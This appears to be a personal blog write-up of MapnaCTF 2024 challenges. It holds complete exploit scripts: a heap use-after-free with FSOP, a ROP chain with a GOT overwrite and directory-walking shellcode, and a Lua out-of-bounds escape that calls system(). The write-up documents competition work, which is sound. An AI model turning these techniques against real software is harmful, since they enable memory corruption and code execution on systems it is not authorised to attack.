---
来源: https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2024年1月
---

、90日以上更新していないブログに表示しています。


I participated in MapnaCTF, which is a CTF event sponsored by Mapna group and hosted by ASIS team.
I played it as a member of BunkyoWesterns [\*1](#f-661dd72a "a joke team not relevant to TokyoWesterns at all") and stood 1st place :)

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123140703.png)

BunkyoWesterns' cat is cute

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123141111.png)

街中でサトちゃんを見つけた人には幸運が訪れると言われている。

The pwnable tasks (presumably) written by [parrot](https://twitter.com/parrot409) were interesting yet beginner-friendly 👍👍👍

* [Pwnable](#Pwnable)
  + [Buggy Paint (16 solves)](#Buggy-Paint-16-solves)
  + [Protector (12 solves)](#Protector-12-solves)
  + [U2S (2 solves)](#U2S-2-solves)
* [Reversing](#Reversing)
  + [Compile Me! (142 solves)](#Compile-Me-142-solves)
  + [Heaverse (42 solves)](#Heaverse-42-solves)
  + [Prism (23 sovles)](#Prism-23-sovles)
  + [Tetim (7 solves)](#Tetim-7-solves)
* [Forensics](#Forensics)
  + [Mitrek (2 solves)](#Mitrek-2-solves)

# Pwnable

## Buggy Paint (16 solves)

The program is a paint-like application where you can draw some rectangles on a [canvas](https://d.hatena.ne.jp/keyword/canvas).
We can allocate and store the following structure into each pixels in the [canvas](https://d.hatena.ne.jp/keyword/canvas).

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123141553.png)

Each rectangle has its position, size, color, and a byte array.
If we select a rectangle, we can edit or show its byte array.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123141856.png)

The bug lies in delete function.
As you can find in the figure below, it doesn't check if the deleted rectangle is selected at the moment.
This will result in Use-after-Free accessing a deleted rectangle in edit and show functions.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123142026.png)

I simply overlapped a rectangle object with byte array, with which I could overwrite the pointer of the rectangle's data array.
In this way we can get [AAW](https://d.hatena.ne.jp/keyword/AAW) primitive.

```
from ptrlib import *

# Utility functions
...
... not important, redacted
...

libc = ELF("./libc.so.6")
#sock = Process("./chall")
sock = Socket("nc 3.75.185.198 2000")

# Leak heap
create(0, 0, 0x10, 2, 1, b"A"*0x20)
create(1, 0, 0x10, 2, 1, b"B"*0x20)
create(9, 9, 0x10, 2, 1, b"C"*0x20)
select(0, 0)
delete(0, 0)
heap_base = u64(show()[:8]) << 12
logger.info("heap = " + hex(heap_base))

# Leak libc
select(1, 0)
delete(1, 0)
target = heap_base + 0x360
edit(p64(target ^ (heap_base >> 12)))
create(2, 0, 0x10, 2, 1, p64(0x431)*4)
create(1, 0, 0x10, 2, 1, b"D"*0x20)
payload = p64(0x21)*((0x20 * 0x1e) // 8)
create(0, 0, 0x20, 0x1e, 1, payload)
select(1, 0)
delete(1, 0)
libc.base = u64(show()[:8]) - libc.main_arena() - 0x60

# Create AAW
payload  = b"X"*0x20
payload += p64(9) + p64(9) + p64(heap_base) + p64(0x10) + p64(2)
payload += p64(heap_base + 0x3c0)
payload += p64(0) + p64(0x31)
payload += b"X"*(0x90 - len(payload))
payload += p64(0) # x
payload += p64(0) # y
payload += p64(heap_base)
payload += p64(0xe0) # width
payload += p64(1) # height
payload += p64(libc.symbol("_IO_2_1_stderr_"))
create(2, 2, 0x10, 0x10, 1, payload)

# FSOP
...
... not important, redacted 
...
select(0, 0)
edit(payload)

# Win
sock.sendlineafter("> ", "6")

sock.sh()
```

First blood 🩸

## Protector (12 solves)

This challenge is so straightforward that I can't understand why only 12 teams solved it[\*2](#f-8c0f033a "Probably because it's released later").

The challenge is a simple stack buffer overflow with seccomp enabled.
The flag is located in `maze` folder where many other dummy files exist.

Since `mprotect`, `open`, `read`, `write`, `getdents` are allowed, we can search for the flag in the directory.

```
from ptrlib import *

elf = ELF("./chall")
while True:
    #sock = Process("./chall")
    sock = Socket("nc 3.75.185.198 10000")
    #sock = Socket("localhost", 5000)

    addr_rop1 = 0x4040a0
    size = 0x400

    # Stage 1
    payload  = b"A"*0x28
    payload += flat([
        # read(0, addr_rop1, size)
        next(elf.gadget("pop rdi; pop rsi; pop rdx; ret;")),
        0, addr_rop1, size,
        elf.plt("read"),
        # read(0, read@got, 2)
        next(elf.gadget("pop rdi; pop rsi; pop rdx; ret;")),
        0, elf.got("read"), 2,
        elf.plt("read"),
        # rsp = addr_rop1-8
        next(elf.gadget("pop rbp; ret;")),
        addr_rop1 - 8,
        next(elf.gadget("leave; ret;"))
    ], map=p64)
    payload += b"A" * (0x98 - len(payload))
    sock.sendafter("Input: ", payload)

    # Stage 2
    payload = flat([
        # mprotect(0x404000, 0x1000, 7)
        next(elf.gadget("pop rdi; pop rsi; pop rdx; ret;")),
        0x404000, 0x1000, 7,
        elf.plt("read"),
        # shellcode
        0x4040d0
    ], map=p64)

    payload += nasm(f"""
      xor esi, esi
      lea rdi, [rel maze]
      mov eax, {syscall.x64.open}
      syscall
      mov r13, rax
      cld

    lp:
      mov edx, 0x40
      lea rsi, [rel data]
      mov rdi, r13
      mov eax, {syscall.x64.getdents}
      syscall
      test eax, eax
      jz end

      mov dword [rel data + 18 - 5], 'maze'
      mov byte [rel data + 18 - 1], '/'

      xor esi, esi
      lea rdi, [rel data + 18 - 5]
      mov eax, {syscall.x64.open}
      syscall

      mov edx, 0x100
      lea rsi, [rel data]
      mov edi, eax
      mov eax, {syscall.x64.read}
      syscall
      test rax, rax
      jle lp

      mov edx, eax
      mov edi, 1
      mov eax, {syscall.x64.write}
      syscall

      jmp lp

    end:
      xor edi, edi
      mov eax, {syscall.x64.exit_group}
      syscall

    maze: db "./maze", 0
    data:
    """, bits=64)
    payload += b"A" * (size - len(payload))
    sock.send(payload)

    # read --> mprotect
    sock.send(b"\xa0\xaa")

    try:
        print(sock.recvonce(4, timeout=2))
    except TimeoutError:
        sock.close()
        continue

    sock.sh()
    break
```

By the way, my exploit partially overwrites GOT entry of `read` to create a pointer to `mprotect`.
I thought it would require brute force of 4-bit entropy because only 12 bits out of the 2 bytes are fixed.

The funny thing, however, is that it didn't require brute force thanks to the broken ASLR:

> So apparently starting with [Linux](https://d.hatena.ne.jp/keyword/Linux) 5.18, ASLR is weakened for 64-bit executables, and absolutely BROKEN (i.e. not present) for 32-bit executables when the library is 2MB or larger.  
> Oops? 🤦‍♂️<https://t.co/N5uxSR8ehB> [pic.twitter.com/1X4YPoQouG](https://t.co/1X4YPoQouG)
>
> — Will Dormann (@wdormann) [2024年1月12日](https://twitter.com/wdormann/status/1745853423809872210?ref_src=twsrc%5Etfw)

First blood 🩸

## U2S (2 solves)

I think this challenge is very educational and is a good introduction to exploiting [Lua](https://d.hatena.ne.jp/keyword/Lua).

The following patch introduced a bug.

```
diff --git a/src/lvm.h b/src/lvm.h
index dba1ad2..485b5aa 100644
--- a/src/lvm.h
+++ b/src/lvm.h
@@ -96,7 +96,7 @@ typedef enum {
 #define luaV_fastgeti(L,t,k,slot) \
   (!ttistable(t)  \
    ? (slot = NULL, 0)  /* not a table; 'slot' is NULL and result is 0 */  \
-   : (slot = (l_castS2U(k) - 1u < hvalue(t)->alimit) \
+   : (slot = (l_castU2S(k) - 1u < hvalue(t)->alimit) \
               ? &hvalue(t)->array[k - 1] : luaH_getint(hvalue(t), k), \
       !isempty(slot)))  /* result not empty? */
```

The macro `luaV_fastgeti` is used for getting an element of an array.
`S2U` means "signed to unsigned", and `U2S` means "unsigned to signed."
This apparently causes type mismatch.

In fact, it allows negative out-of-bounds [access](https://d.hatena.ne.jp/keyword/access) of array.

Sadly, another patch disables leaking pointers through `tostring` function that I often use when exploting [Lua](https://d.hatena.ne.jp/keyword/Lua).

```
diff --git a/src/lapi.c b/src/lapi.c
index 34e64af..b1501c8 100644
--- a/src/lapi.c
+++ b/src/lapi.c
@@ -473,18 +473,7 @@ LUA_API lua_State *lua_tothread (lua_State *L, int idx) {
 ** conversion should not be a problem.)
 */
 LUA_API const void *lua_topointer (lua_State *L, int idx) {
-  const TValue *o = index2value(L, idx);
-  switch (ttypetag(o)) {
-    case LUA_VLCF: return cast_voidp(cast_sizet(fvalue(o)));
-    case LUA_VUSERDATA: case LUA_VLIGHTUSERDATA:
-      return touserdata(o);
-    default: {
-      if (iscollectable(o))
-        return gcvalue(o);
-      else
-        return NULL;
-    }
-  }
+  return NULL;
 }
```

So, the first thing we need to do is leaking some addresses.

In order to make the exploit stable, I always spray data to consume freed chunks:

```
   -- Consume all freed chunks
   local allocator = string.rep("A", 0x1000)
   collectgarbage()
   local consume = {}
   local consume_i = 0
   for size = 0x800, 0x10, -0x10 do
      for i = 1, 8 do
         consume_i = consume_i + 1
         consume[consume_i] = string.sub(allocator, -size)
      end
   end
   for i = 1, 0x20 do
      consume_i = consume_i + 1
      consume[consume_i] = { 0xdead }
   end
   for i = 1, 0x80 do
      consume_i = consume_i + 1
      consume[consume_i] = string.sub(allocator, -0x40) .. "xx"
   end
   consume[0] = string.sub(allocator, -0x20) .. "xx"
   local gorilla = {};
```

In this way, continuous region will be carved out from heap when allocating objects.
For example, assume that we allocate a string and an array like this:

```
   local leak = string.rep("C", 0x30)
   local evil = {3.14, 3.14, 3.14, 3.14}
```

Then, the memory layout looks like this:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123164843.png)

Thanks to the heap spray, offset between the string data and the array data is fixed.
So, we can create addrof/fakeobj primitive easily.

A [Lua](https://d.hatena.ne.jp/keyword/Lua) [value](https://d.hatena.ne.jp/keyword/value) is a pair of pointer and type.

```
#define TValuefields    Value value_; lu_byte tt_

typedef struct TValue {
  TValuefields;
} TValue;
```

The [value](https://d.hatena.ne.jp/keyword/value) of a built-in function is function pointer.
So, if we set a built-in function out-of-bounds in the array, we can leak the pointer from string. (Addrof primitive)

```
   -- Leak proc base
   local leak = string.rep("C", 0x30)
   local evil = {3.14, 3.14, 3.14, 3.14}
   evil[-7] = print
   local proc_base = u64(string.sub(leak, 9, 16)) - 0x376d4
   print(proc_base)
```

Similarly, we can get an element out-of-bounds to refer to a fake object. (Fakeobj primitive)

```
   -- Call fake func
   local fake = p64(0)
      .. p64(proc_base + 0x6670) .. p64(0x16) -- fake built-in function (system@plt)
   local evil = {1.11, 1.11, 1.11, 1.11}

   (evil[-5])()
```

I could have just called `os.execute` because the source code is built as debug mode.
However, I thought the feature was optimized out and decided to call `system` directly. (and yeah it's more practical in real-world examples!)

So, if you're reading this article to get the flag, you can simply call `os.execute` and skip the rest of this writeup.
If you're interested in how to make AAR/[AAW](https://d.hatena.ne.jp/keyword/AAW) primitives in [Lua](https://d.hatena.ne.jp/keyword/Lua), you can continue reading it :)

...

The first argument passed to the (fake) built-in function is `lua_State`:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123170548.png)

If we copy our command string into this variable and call system, we will get the flag.
[Lua](https://d.hatena.ne.jp/keyword/Lua) [interpreter](https://d.hatena.ne.jp/keyword/interpreter) has only one state and it's stored in a global variable named `globalL`:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123170626.png)

Since we have the program base address, we can leak it by making AAR primitive.

Making AAR primitive is a bit tricky because each [Lua](https://d.hatena.ne.jp/keyword/Lua) [value](https://d.hatena.ne.jp/keyword/value) must have a valid type.
Meanwhike, making [AAW](https://d.hatena.ne.jp/keyword/AAW) primitive is simple because we don't need to care about the type.

To read a [value](https://d.hatena.ne.jp/keyword/value) from memory, we have to first write the type (`LUA_NUMBER`) to the address plus 8.
(For more details, you can check [this article](https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html) that I wrote before.)

The following code will leak the address of `globalL`:

```
   -- Leak lua state
   local fake_func = p64(0)
      .. p64(proc_base + 0x6670) .. p64(0x16)     -- fake function
      .. p64(addr_fake_table + 0x20) .. p64(0x45) -- fake table 1
      .. p64(addr_fake_table + 0x50) .. p64(0x45) -- fake table 2
   local satoki = {2.17, 2.17, 2.17, 2.17}
   satoki[-5][1] = 0x13

   -- Read float as bytes
   evil[-6] = satoki[-6][1]
   local addr_state = u64(string.sub(leak, 25, 32))
   print(addr_state)
```

Let's write our command string to `globalL`.
We need to call `/readflag` to get the flag. I wrote `/readf*` instead because it requires just a single write.

```
   -- Call fake func
   local fake = p64(0)
      .. p64(proc_base + 0x6670) .. p64(0x16) -- system
      .. p64(addr_fake_table2 + 0x20) .. p64(0x45)
   local sugiyama = {1.11, 1.11, 1.11, 1.11}

   sugiyama[-5][1] = 7.342735162138363e-308 -- "/readf*\0"
   (sugiyama[-6])()
```

Full exploit:

```
function pwn()
   -- Utility
   function p64(v)
      local s = "";
      for i = 0, 7 do
         s = s .. string.char((v >> (i * 8)) & 0xff)
      end
      return s;
   end
   function u64(s)
      local v = 0
      for i = 0, 7 do
         v = v + (string.byte(s, i+1) << (i*8))
      end
      return v;
   end

   -- Consume all freed chunks
   local allocator = string.rep("A", 0x1000)
   collectgarbage()
   local consume = {}
   local consume_i = 0
   for size = 0x800, 0x10, -0x10 do
      for i = 1, 8 do
         consume_i = consume_i + 1
         consume[consume_i] = string.sub(allocator, -size)
      end
   end
   for i = 1, 0x20 do
      consume_i = consume_i + 1
      consume[consume_i] = { 0xdead }
   end
   for i = 1, 0x80 do
      consume_i = consume_i + 1
      consume[consume_i] = string.sub(allocator, -0x40) .. "xx"
   end
   consume[0] = string.sub(allocator, -0x20) .. "xx"
   local gorilla = {};

   -- Leak proc base
   local leak = string.rep("C", 0x30)
   local evil = {3.14, 3.14, 3.14, 3.14}
   evil[-7] = print
   local proc_base = u64(string.sub(leak, 9, 16)) - 0x376d4
   print(proc_base)

   -- Leak fake table
   local fake_table = p64(0)
      .. p64(0) -- fake table 1
      .. p64(0x00000004003f1005)
      .. p64(proc_base + 0x50050) -- globalL
      .. p64(proc_base + 0x42510)
      .. p64(0) .. p64(0)
      .. p64(0) -- fake table 2
      .. p64(0x00000004003f1005)
      .. p64(proc_base + 0x50058) -- globalL + 8
      .. p64(proc_base + 0x42510)
      .. p64(0) .. p64(0)
   evil[-6] = fake_table
   local addr_fake_table = u64(string.sub(leak, 25, 32))
   print(addr_fake_table)

   -- Leak lua state
   local fake_func = p64(0)
      .. p64(proc_base + 0x6670) .. p64(0x16)     -- fake function
      .. p64(addr_fake_table + 0x20) .. p64(0x45) -- fake table 1
      .. p64(addr_fake_table + 0x50) .. p64(0x45) -- fake table 2
   local satoki = {2.17, 2.17, 2.17, 2.17}
   satoki[-5][1] = 0x13
   print(satoki[-6][1])

   -- Read float as bytes
   evil[-6] = satoki[-6][1]
   local addr_state = u64(string.sub(leak, 25, 32))
   print(addr_state)

   -- Leak fake table
   local fake_table2 = p64(0)
      .. p64(0) -- fake table 3
      .. p64(0x00000004003f1005)
      .. p64(addr_state) -- target
      .. p64(proc_base + 0x42510)
      .. p64(0) .. p64(0)
   evil[-6] = fake_table2
   local addr_fake_table2 = u64(string.sub(leak, 25, 32))
   print(addr_fake_table2)

   -- Call fake func
   local fake = p64(0)
      .. p64(proc_base + 0x6670) .. p64(0x16) -- system
      .. p64(addr_fake_table2 + 0x20) .. p64(0x45)
   local sugiyama = {1.11, 1.11, 1.11, 1.11}

   sugiyama[-5][1] = 7.342735162138363e-308 -- "/readf*\0"
   (sugiyama[-6])()
end

pwn()

-- EOF --
```

First blood 🩸

# Reversing

## Compile Me! (142 solves)

Compile the given C code and feed the code to stdin to get the flag.
Note that you don't need to append newline in the code.

## Heaverse (42 solves)

The program looks like a custom [VM](https://d.hatena.ne.jp/keyword/VM) but just implements meaningless instructions like making a sound or sleeping for a while.
I checked the stack and found the flag encoded with morse.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123172224.png)

First blood 🩸

## Prism (23 sovles)

The program just prints "Your mission is to find the flag! Try harder!!".
The function that prints this string is located at 0x31c0.
The string is encoded with XOR cipher.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123172737.png)

I looked over other functions and found 0x3330 prints the flag.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123173103.png)

First blood 🩸

## Tetim (7 solves)

The program accepts a binary file and outputs a [PNG](https://d.hatena.ne.jp/keyword/PNG) file.
Since the binary is compiled by Zig, I decided to analyze it dynamically without reading the code.

I wrote a code like this:

```
import os
from PIL import Image

with open("a.bin", "wb") as f:
    f.write(b"\x80\x40\x10\x20\x01\x02\x02\x04\x04\x05")

os.system("./tetim.elf embed a.bin")

img = Image.open("a.bin.enc")
print(img.size)
print("-"*8)
for y in range(img.size[1]):
    for x in range(img.size[0]):
        print(img.getpixel((x, y)))
    print("-"*16)
```

It turned out that each byte is mapped to color code of each pixel.
(The output is sometimes different but mostly the same.)

```
from PIL import Image

img = Image.open("secret.enc")
data = b""
for y in range(img.size[1]):
    for x in range(img.size[0]):
        c = img.getpixel((x, y))
        data += bytes([c[0]])

print(data)
```

Output:

```
b'IPEG (/\xcb\x88d\xc9\x91e\xc9\xaaq\xc9\x9b\xc9\xa1/!JAY-oeg,\x1fshort\x1ffor Joint Photohraphic Fxperts Grotp)[2] hs a comlonly ured method of lossy compresrion epr digital imahes, paruicularmy for those images produced by\x1fdigital photography. The degree\x1fof compqessioo!can be adiusted+ allowing a!selectable sradeoff between storage size\x1fand image qualitx. JPEG szpicakly achievet\x1f10:1 compression\x1fwith ljttle oerceptible loss hn imafe qvalitx.\\3] Since its introcuction!jn 1992, JPEG has bfen the moss widely used image conpressinn ssandard in the world,[4][5] and she most widely used digital image form`t, witi several billinn JPEG hm`ges proeuced euery day as!of 2015.[6]\n\nThe Joint Photographic Experts Group created tie standard in 1992.[7] JPEG was largely responshble for she proliferation pe digital images and digital phosos across\x1fuhe Hnternet and later social media.[8][circular referfnce] IPEG compression js used in a numbds of image file formats. JPEG/Exif is the!mort common image format utfc by\x1fdigital c`meras and other photographic inagf capttre devices; alonf xhth JPEG/JFIE, it is the nost cnmmnn foqmat fpr stosing and uranslitsing photographic images on the Wprld Wide Web.[9] These form`t varibtions are often npu cistinguished and arf sjmply\x1fcalled JPEG.\n\nThe MIME meeia type foq JPEG is "imagf/jpeg," except in!older Ioternet Dxplorer versions, whjch providd a MIMD\x1ftype of "image/pjpeg" when uploading JPEG hmahes/[10] JOEG files usuallz gave a filename\x1fextenshom of "ipg" or "jpeg!. JPEG/JFIF supoorts ` laximum image tize!of 65,635\xc3\x9765,535 pixels,[11] hence up to 4!gigapixels for `n aspebt ratjo of 1:1. In 3000+ the IPEG group introcuced a format intended to be a successor, KPEG 2000, but\x1fiu was unabld to rdplace the original\x1fJPFG as thd!dominant image rtbndard.\n\nMAPNA{__ZiG__JPEG^!M49e_3nD0DeR_rEv3R5e!!!}\n+++++++++++*++++++++*++++++++,++++++++++,+\nMAPNA{__ZiG__JPEG_!M49e_3nC0DdR_rEv3R5e!!!}\n++++++++++++++++++++++++++++++++++++++++++\nMAPNA{`_ZiG__KPEG_!M49e_3nC0DeR_rEv3R5e"!!}\n++++*++,+,+,+++++++++*+++++++++++++++++,++\nMAPNA{__ZiG__JOEG_!M39e_2nC1DeR^rEv3R5e"! }\n++*+++++++++,+++++++++++++++++++++++++++++====<=='
```

I chose words that makes sense and it was correct:

```
MAPNA{__ZiG__JPEG_!M49e_3nC0DeR_rEv3R5e!!!}
```

First blood 🩸

# Forensics

## Mitrek (2 solves)

It's been a while since I last solved guessy forensics challenges :)

We're given a pcap file which contains only 2 streams of [UDP](https://d.hatena.ne.jp/keyword/UDP) packets communicating over [localhost](https://d.hatena.ne.jp/keyword/localhost) on port 31337 and 31338.
Each packet looks like this:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240123/20240123174027.png)

Reading some of them, I noticed the packet structure:

```
typedef struct {
  u8 size;
  u32 always_one;
  u8 size_minus_2;
  u8 seq_number;
  u8 type;
  u8 contents[0]; // size-7 bytes
} packet_t;
```

I found `type` represents what kind of packet is means:

* `F`: Sends file name to be saved
* `D`: Data
* `Y`: Accepted
* `N`: Denied
* `S`: Unknown (Handshake?)

I wrote script that dumps the sent files based on the rule above.

```
from scapy.all import *
from ptrlib import *

filename = None
output = {}
fixed = {}
gorira = None

def analyze(pkt):
    global filename, output, fixed, gorira
    if pkt[UDP].sport < pkt[UDP].dport:
        pair = pkt[UDP].sport, pkt[UDP].dport
    else:
        pair = pkt[UDP].dport, pkt[UDP].sport

    payload = bytes(pkt[UDP][Raw].load)
    size = payload[0]
    seq  = payload[6]
    type = payload[7]
    data = payload[8:1+size]

    if pkt[UDP].dport == 31337:
        #print(pkt[UDP].sport, pkt[UDP].dport, seq, data)
        gorira = pkt[UDP].sport, pkt[UDP].dport, seq, data

    if size == 18: # heuristic
        return
    if type == ord('F') or type == 0: # ignore file name and garbage
        filename = data
        output[(pair, filename)] = {}
        fixed[(pair, filename)] = set()
        return

    if type == ord('N') or type == ord('Y'):
        if type == ord('Y'):
            #print(gorira)
            if (pair, filename) in fixed:
                fixed[(pair, filename)].add(seq)

    #print(pkt[UDP].sport, pkt[UDP].dport, seq, data[:0x10])
    if type == ord('D'): # data
        if seq not in fixed:
            output[(pair, filename)][seq] = data

sniff(offline="mitrek", store=0, prn=analyze)

for key in output:
    pair, filename = key
    if len(output[key]) == 0: continue

    f = open(filename.strip(b"\x00").decode() + str(pair[0]), "wb")
    for seq in output[key]:
        if seq in fixed[(pair, filename)]:
            f.write(output[key][seq])
```

The script saves 3 files and we can find each piece of flag image.

First blood 🩸 [\*3](#f-15e9ebd2 "The distributed file was wrong at first and kanon kindly stole my first blood when the file was updated 🥲")

[\*1](#fn-661dd72a):a joke team not relevant to TokyoWesterns at all

[\*2](#fn-8c0f033a):Probably because it's released later

[\*3](#fn-15e9ebd2):The distributed file was wrong at first and [kanon](https://d.hatena.ne.jp/keyword/kanon) kindly stole my first blood when the file was updated 🥲


[« 
Google CTF 2024 Quals Writeups](https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940)

[Understanding Dirty Pagetable - m0leCon…
 »](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606)